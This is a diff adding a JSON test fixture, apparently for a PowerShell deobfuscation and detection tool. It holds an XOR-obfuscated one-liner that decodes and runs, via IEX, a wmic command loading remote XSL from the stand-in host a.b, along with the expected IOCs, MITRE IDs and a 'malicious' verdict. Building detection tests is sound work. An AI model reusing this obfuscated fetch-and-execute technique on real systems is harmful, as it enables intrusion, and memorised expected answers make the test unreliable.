@@ -1,0 +1,46 @@
+{
+  "id": "xor-fill-12",
+  "category": "ps-crypto",
+  "algorithm": "XOR-multi",
+  "command_line": "$k=[Text.Encoding]::UTF8.GetBytes('MyKey123'); $c=[byte[]](58,20,34,6,89,94,65,19,42,28,63,69,86,87,93,65,32,24,63,95,94,89,70,71,61,67,100,74,24,31,80,28,53,87,51,22,21,22); $o=[byte[]]::new($c.Length); for($i=0;$i -lt $c.Length;$i++){$o[$i]=$c[$i] -bxor $k[$i%$k.Length]}; IEX ([Text.Encoding]::UTF8.GetString($o))",
+  "stage_ladder": [
+    {
+      "name": "utf8-key",
+      "recoverable": true,
+      "reason": ""
+    },
+    {
+      "name": "byte-array-parse",
+      "recoverable": true,
+      "reason": ""
+    },
+    {
+      "name": "xor-multi-inline-key",
+      "recoverable": true,
+      "reason": ""
+    },
+    {
+      "name": "utf8-decode",
+      "recoverable": true,
+      "reason": ""
+    }
+  ],
+  "key_status": "inline-static",
+  "expected_plaintext": "wmic os get /format:'http://a.b/x.xsl'",
+  "expected_iocs": [
+    "wmic os get /format:'http://a.b/x.xsl'"
+  ],
+  "expected_lolbins": [
+    "powershell.exe"
+  ],
+  "expected_mitre": [
+    "T1027",
+    "T1059.001",
+    "T1140"
+  ],
+  "expected_verdict": "malicious",
+  "expected_confidence_min": 0.8,
+  "notes": "",
+  "source": "nivxray-rc41-crypto",
+  "license": "CC-BY-4.0"
+}
